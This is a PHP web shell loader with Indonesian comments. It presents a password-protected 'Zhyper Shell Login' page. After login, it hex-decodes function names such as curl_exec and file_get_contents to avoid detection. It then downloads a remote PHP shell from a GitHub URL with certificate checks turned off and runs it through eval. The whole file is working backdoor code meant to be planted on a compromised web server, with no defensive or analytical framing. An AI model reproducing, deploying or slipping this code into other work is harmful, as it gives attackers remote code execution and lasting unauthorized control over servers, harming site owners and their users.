<?php
// --- ERROR HANDLING AKTIF ---
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();

// --- CEK LOGIN SESSION ---
function is_logged_in() {
    return isset($_SESSION['zhyper_logged_in']) && $_SESSION['zhyper_logged_in'] === true;
}

if (is_logged_in()) {
    // --- HEX TO STR ---
    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    // --- FUNGSI AMBIL FILE DARI URL ---
    function geturlsinfo($destiny) {
        $Array = array(
            '666f70656e', // fopen
            '73747265616d5f6765745f636f6e74656e7473', // stream_get_contents
            '66696c655f6765745f636f6e74656e7473', // file_get_contents
            '6375726c5f65786563' // curl_exec
        );
        $GLOBALS['Array'] = $Array; // FIX PENTING

        $belief = array(
            hex2str($GLOBALS['Array'][0]),
            hex2str($GLOBALS['Array'][1]),
            hex2str($GLOBALS['Array'][2]),
            hex2str($GLOBALS['Array'][3])
        );

        // --- METODE CURL ---
        if (function_exists($belief[3])) {
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        }
        // --- METODE FILE_GET_CONTENTS ---
        elseif (function_exists($belief[2])) {
            return $belief[2]($destiny);
        }
        // --- METODE FOPEN ---
        elseif (function_exists($belief[0]) && function_exists($belief[1])) {
            $purpose = $belief[0]($destiny, "r");
            if ($purpose) {
                $love = $belief[1]($purpose);
                fclose($purpose);
                return $love;
            }
        }
        return false;
    }

    // --- AMBIL FILE DARI URL ---
    $destiny = 'https://github.com/micikeleng/shell/raw/refs/heads/main/alfazhyperkeras.php';
    $dream = geturlsinfo($destiny);

    // --- DEBUG & JALANKAN ---
    if ($dream !== false && trim($dream) !== '') {
        echo "<!-- Payload Loaded -->";
        eval("?>".$dream);
    } else {
        echo "<div style='color:red;'>Gagal mengambil payload. Cek URL atau koneksi server.</div>";
    }

} else {
    // --- LOGIN FORM ---
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$r22EYCNDs3dHlMT09.3ghOnmLn429l4Wfy5j9iLOTFOZaj5IhmZUO'; // password_hash()
        
        if (password_verify($entered_key, $hashed_key)) {
            $_SESSION['zhyper_logged_in'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Password salah!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Zhyper Shell Login</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="d-flex justify-content-center align-items-center vh-100" style="background-color: black; color: white;">
        <div class="container text-center">
            <h1>Zhyper Shell Login</h1>
            <?php if (isset($error)) echo "<div class='alert alert-danger'>{$error}</div>"; ?>
            <form method="POST">
                <div class="mb-3">
                    <input type="password" name="password" class="form-control" placeholder="Masukkan Password" required>
                </div>
                <button type="submit" class="btn btn-primary">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
}
?>
